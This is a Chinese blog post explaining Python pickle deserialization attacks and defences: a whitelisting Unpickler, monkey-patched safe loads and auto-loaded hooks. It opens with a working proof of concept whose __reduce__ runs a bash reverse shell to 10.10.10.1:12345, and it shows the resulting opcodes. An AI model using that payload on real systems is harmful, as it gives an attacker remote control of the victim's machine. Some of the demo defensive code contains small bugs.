---
title: "飞哥讲代码24：从Python Pickle漏洞说起"
date: "2021-03-13"
categories:
 - "技术"
tags:
 - "软件开发"
 - "python"
toc: true
---

>《泾溪》-- 杜荀鹤  
> 泾溪石险人兢慎，终岁不闻倾覆人。  
> 却是平流无石处，时时闻说有沉论。 

# 案例

有次同事找我看个Python的安全问题。测试代码是这样的：

```python
import pickle
import os

class Test(object):
    def __reduce__(self):
        cmd = """bash -i &> /dev/tcp/10.10.10.1/12345 0>&1 2>&1"""
        return (os.system,(cmd,))

if __name__ == "__main__":
    test = Test()
    bs = pickle.dumps(test)
    pickle.loads(bs)
```

这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。

目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。

<!--more-->
# 漏洞分析

pickle在[python的官方介绍](https://docs.python.org/3/library/pickle.html)中有一段这样的介绍:

> **Warning** The pickle module **is not secure**. Only unpickle data you trust.   
> 
> It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
> 
> Consider signing data with hmac if you need to ensure that it has not been tampered with.

简单翻译一下：只对你信任数据进行unpickle，因为可以构建恶意的pickle数据，在unpickle时会执行任何代码，要么考虑采用hmac对数据签名检查。

pickle是一种基于栈的编程语言，目前发展到python3.8已有5个版本协议。我们使用python2先看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:

```python
cposix
system
p0
(S'bash -i &> /dev/tcp/10.10.10.1/12345 0>&1 2>&1'
p1
tp2
Rp3
.
```

这是pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：

 - 指令处理器(Instruction processor)：解释与执行指令，遇到`.`结束
 - 栈区(stack)：数据处理过程中的暂存区，通过进出栈完成数据操作
 - 标签区(memo)：数据索引或者标记，全生命周期存储数据，以Key/Value存储数据

结合上面生成的内容来看，它有如下指令：

 - `c`：读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将module.object作为可调用对象压入到栈中。注：os模块在linux下其实是posix
 - `(`：标记对象压入到栈中, 常搭配`t`指令一起使用, 以便产生一个元组
 - `t`：从堆栈中弹出对象，创建一个包含弹出对象除了`(`的元组对象
 - `S`：后面跟字符串，遇到换行将内容压入到栈中
 - `R`：将之前压入栈中的元组和可调用对象全部弹出，将该元组作为可调用参数的对象并执行该对象，并把执行结果压入到栈中
 - `.`：结束整个pickle反序列化过程
 - `p1~p3`：将栈顶数据存入memo中，后面的数字是编号

当然pickle还有其它的指令，这里就不再一一列出了，更多的指令可以查看pickle的源码[pickle.py](https://github.com/python/cpython/blob/master/Lib/pickle.py#L111)。

pickle反序列化漏洞出在[`__reduce__`](https://docs.python.org/3/library/pickle.html#object.__reduce__)函数上，当采用C语言定义Python扩展类型时，若想pickle此类型，则需要告诉python如何pickle它们。一旦
`__reduce__`函数定义，pickle序列化时会被调用，它要么返回一个代表全局名称的字符串，要么返回一个元组。这个元组包含2到6个元素，其中包括：

 - 一个可调用的对象，用于重建对象时调用
 - 一个参数元素，供那个可调用对象使用
 - 被传递给 `__setstate__` 的状态， 可选
 - 一个产生被pickle的列表元素的迭代器，可选
 - 一个产生被pickle的字典元素的迭代器，可选
 - 一个可以调用的callable，参数为(obj, state)，可选，3.8才新增的

就是由于个这个元组，跟pickle中的指令`R`可被利用之机："该元组作为可调用参数的对象并执行该对象"，如果这个元组有恶意代码，则可以调用而产生风险。虽然`__reduce__`返回只能是一个可调用对象，但可以结合os.system，subprocess.run，exec来执行任一命令或代码，几乎能做任何事了。

# 解决办法

正如python官方对pickle的介绍说明，只对信任的数据unpickle，对数据数字签名检查。但通常数字签名只限于自产自销的场景。打开pickle的源码来看，事实上还有另一个方法。python定义了Unpickler的接口，关键在于可以覆写find_class，下面是标准库的默认实现：

```python
    def find_class(self, module, name):
        # Subclasses may override this.
        sys.audit('pickle.find_class', module, name)
        if self.proto < 3 and self.fix_imports:
            if (module, name) in _compat_pickle.NAME_MAPPING:
                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
            elif module in _compat_pickle.IMPORT_MAPPING:
                module = _compat_pickle.IMPORT_MAPPING[module]
        __import__(module, level=0)
        if self.proto >= 4:
            return _getattribute(sys.modules[module], name)[0]
        else:
            return getattr(sys.modules[module], name)
```

默认实现的find_class函数会自动导入模块，并且还兼容python2时fix_imports。若覆写，采用对导入模块做白名单检查控制，不允许导入像os.system等可以执行命令或代码能力，则问题已基本可以解决。那这个函数什么时机被调用呢？从代码搜索来看有4处调用此函数，他们是在解释指令的地方。如案例中的`c`指令导入模块时，就会调用它。 


```python
import pickle

class WhiteListUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        self.check_safe_module(module, name)
        return super().find_class(module, name)
    
    def check_safe_module(module, name):
        # 检查是否在白名单
        if module != '__main__': 
            raise pickle.UnpicklingError("'%s.%s' is forbidden" % (module, name))

bs = b'....' # 需要unpickler的内容
file = io.BytesIO(bs)
WhiteListUnpickler(file).load()
```

上面的代码示例只允许`__main__`模块调用，采用白名单谨慎列出安全的模块则可以规避安全问题。但这需要调用者生成WhiteListUnpickler类，对业务代码有侵入性。那有没有一种对上层调用不感知的修改？有:

```python
import pickle

def safe_load(file, *, fix_imports=True, encoding="ASCII", errors="strict",
          buffers=None):
    return WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
                     encoding=encoding, errors=errors).load()

def safe_loads(s, *, fix_imports=True, encoding="ASCII", errors="strict",
           buffers=None):
    file = io.BytesIO(s)
    return WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
                      encoding=encoding, errors=errors).load()

pickle.load = safe_load
pickle.loads = safe_loads

# 后面的代码调用pickle.loads时，真实调用的safe_loads
```

python是动态语言，任何模块、对象、函数都是可能动态替换的，不光如此，还可以动态给类/实例增加方法或成员变量。

# 自动加载

前面通过safe_loads替换了标准库的实现，但我们还需要解决一个问题，如何让替换的代码先于业务代码执行？不好的做法是所有替换逻辑封装一个API，让业务在启动时最开始的地方调用一下。那有没有一种对上层不感知的自动加载？有。

对于C程序，通过设置LD_PRELOAD环境变量可以先加载一个动态库，替换系统函数或者进程中其它导出符号的函数。Python是否也有一种机制？Python的玩法有些不一样，提供了另一种机制。参见官方文档[site —— 指定域的配置钩子](https://docs.python.org/zh-cn/3/library/site.html)。对机制简述如下：

 - 标准库有一个site.py文件，它会在python启动时先于业务脚本执行
 - site.py会扫描site-packages目录下所有.pth扩展名的文件
 - 执行这些文件中代码(写法有要求)，并把它返回的path加入到sys.path中，以便能import
  
这就相当留下一个钩子，可以完成第三方模块导入时的初始化。利用这个机制，同样可以完成需要替换的函数先于业务代码自动加载。site机制如此的强大，其实也是一个非常大的安全隐患。因为我们通过pip install来安装第三方库，也可能写入pth文件，若它是一个恶意库或被篡改了，鬼知道它会做什么呢。前一段时间刷新闻看到pypi仓库清理了5000多个有问题的库。

假定我们需要替换多个标准库的函数实现，若一个个通过`pickle.loads = safe_loads`这类方式来替换看起来有点比较丑陋，有没有一种可以比较好玩的方法？有：

```python
class Hook:
    def __init__(self):
        self._hook_to_orig = dict()
        self._orig_to_hook = dict()

    def register(self, obj, attr):
        """注册hook函数"""
        full_name = '.'.join([obj.__name__, attr])
        def wrapper(new_attr):
            self._orig_to_hook[full_name] = new_attr
            old_attr = getattr(obj, attr)
            setattr(obj, attr, new_attr)
            self._hook_to_orig[new_attr.__name__] = old_attr
            return new_attr
        return wrapper

    def get_orig_func(self):
        """获取原始函数"""
        frame = sys._getframe(1)
        if frame and frame.f_code.co_name in self._hook_to_orig:
            return self._hook_to_orig[frame.f_code.co_name]
        else:
            raise Exception("`original` must be called from a hooked function")

hook = Hook()

# 示例，对os.system进行hook
@hook.register(os, 'system')
def hook_system(cmd):
    raise Exception("forbid execute the function")

# 示例，对open进行hook
@hook.register(buildins, 'open')
def hook_open(*arg, **argv):
    orig = get_orig_func()
    # 对参数检查，如检查文件路径是否合法 
    return orig(*arg, **argv)
```

代码不算很难，Hook类主要提供两个函数（注：代码只做演示，未考虑一些异常场景）：

 - register：装饰器函数，用于注册hook的函数，保存与原始函数映射关系
 - get_orig_func：用于获取原始函数

假定把上面的代码放在一个叫hook.py文件中，创建一个hook.pth放在site-packages目录下，它通过runpy.run_module执行hook.py，则可以完成了各种hook，前面的pickle的扩展也可以采用此方法，完成自动加载，并且可以进步在find_class修改，查找已被替换的安全函数，而不是原始函数。

当然上面的演示只是让替换现有函数看起来美观一些，若应用层代码能拿到hook对象，还是可以找回来原始函数，这就是可以绕开了安全检查（逃逸）。若避免逃逸还需要禁止各种可能的绕过：比如禁止导入hook模块，禁上执行hook代码，禁止执行被hook函数的源码等等。

再扩展一下，基于上述的机制，我们可以实现一套安全库，用于尽可能减少代码出现潜在的安全风险，把已知经验沉淀下来：比如路径检查，执行命令检查，端口检查，反序列化检查，代码执行检查，xml实体攻击检查，高风险函数禁用等等。我们搞安全，不仅仅是要做CheckList，更加要沉淀代码复用。

# 结语

代码安全问题随处可见，犯错的成本很低。道路千万条，安全第一条，通过框架/CBB来减少代码层面的安全风险是一条比较好的路。正好本文开头的诗句所讲的，兢慎减少风险，平流容易大意。做为一名程序员，无论如何，我们要先记住不信任任何外部输入，树立安全风险意识。

